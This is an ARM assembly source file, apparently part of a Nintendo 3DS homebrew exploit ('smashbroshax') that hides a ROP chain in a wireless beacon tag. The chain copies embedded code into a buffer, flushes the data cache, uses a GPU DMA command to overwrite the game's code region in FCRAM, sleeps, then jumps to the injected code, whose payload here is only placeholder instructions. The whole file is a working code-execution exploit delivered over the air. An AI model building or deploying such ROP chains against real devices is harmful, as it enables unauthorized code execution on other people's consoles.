.arm
.section .init
.global _start

#include "smashbroshax.h"

@ Beacon tag data for custom OUI-type 0x80. The inital ROP-chain in smashbros_beaconoui15.s loads this ROP-chain data.

_start:
.byte 0x00, 0x1f, 0x32 @ OUI
.byte 0x80 @ OUI type

ropstart:
.word POP_LRPC
.word POP_PC @ lr

.word POP_R0R4SLIPPC
.word TMPBUF_ADR @ r0, dst
.word (arm11code-_start) + BEACONTAGDATA_OUITYPE80_ADR @ r1, src
.word arm11code_end-arm11code @ r2, size
.word 0 @ r3
.word 0 @ r4
.word 0 @ sl
.word 0 @ ip

.word MEMCPY

.word POP_R0R4SLIPPC
.word TMPBUF_ADR @ r0, buf
.word 0x100 @ r1, size
.word 0 @ r2
.word 0 @ r3
.word 0 @ r4
.word 0 @ sl
.word 0 @ ip

.word GSPGPU_FLUSHDCACHE

.word POP_LRPC
.word POP_R0R4SLIPPC @ lr

.word POP_R0R4SLIPPC
.word TMPBUF_ADR @ r0, srcaddr
.word 0x30000000+TEXT_FCRAMOFFSET @ r1, dstaddr
.word 0x100 @ r2, size
.word 0 @ r3, width0
.word 0 @ r4
.word 0 @ sl
.word 0 @ ip

.word GXLOW_CMD4

.word 0 @ sp0 height0
.word 0 @ sp4 width1
.word 0 @ sp8 height1
.word 0x8 @ sp12 flags
.word 0 @ r4
.word 0 @ sl
.word 0 @ ip

.word POP_R0R4SLIPPC
.word 1000000000 @ r0
.word 0 @ r1
.word 0 @ r2
.word 0 @ r3
.word 0 @ r4
.word 0 @ sl
.word 0 @ ip

.word POP_LRPC
.word POP_PC @ lr

.word SVCSLEEPTHREAD @ Delay 1 second so that the above cmd can finish, then jump to the loaded code.

.word 0x00100000

arm11code:
nop
nop
nop
nop
.word 0xffffffff

.word 0x40404040

arm11code_end:

.fill ((_start + 0xfc) - .), 1, 0xffffffff

